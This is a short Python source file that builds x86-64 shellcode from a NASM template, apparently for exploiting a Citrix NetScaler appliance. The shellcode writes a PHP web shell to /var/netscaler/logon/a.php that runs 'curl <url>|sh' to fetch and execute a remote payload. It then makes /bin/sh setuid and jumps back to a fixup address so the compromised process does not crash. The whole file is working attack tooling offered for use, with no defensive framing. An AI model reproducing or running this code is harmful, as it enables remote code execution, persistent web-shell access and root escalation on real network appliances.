import os, tempfile

template="""bits 64

; fd=open("/var/netscaler/logon/a.php", O_WRONLY|O_TRUNC|O_CREAT, 0777);
lea rdi, [rel path1]
xor edx, edx
push 5         ; sys_open
pop rax
xor esi, esi
mov si, 0x0601 ; O_WRONLY|O_TRUNC|O_CREAT
mov dx, 0x1ff  ; 0777
syscall

; write(fd, shell, strlen(shell));
push rax
pop rdi
push 4
pop rax        ; sys_write
lea rsi, [rel cmd]
xor edx, edx
mov dl, path1-cmd
syscall

; chmod("/bin/sh", 6555);
mov al, 15      ; sys_chmod
lea rdi, [rel path2]
xor esi, esi
mov si, 0xd6d   ; 06555
syscall

; avoid crashing 
lea rbp, [rsp+{}]  ; not always required, depends on the version.
push {}
ret

; constants
cmd:
db "<?=`curl {}|sh`;"
path1:
db "/var/netscaler/logon/a.php", 0
path2:
db "/bin/sh", 0
"""

def mkshellcode(rbp_fixup, fixup, payload_url):
    """
    fixup: hex string starting with 0x, pointing to the address to jump to after shellcode runs
    payload_url: location of the payload on an http server 
    """
    asm=template.format(rbp_fixup, fixup, payload_url)
    with tempfile.TemporaryDirectory() as tmpd:
        open(tmpd+"/shellcode.S","w").write(asm)
        os.system("nasm "+tmpd+"/shellcode.S")
        shellcode=open(tmpd+"/shellcode","rb").read()
    return shellcode
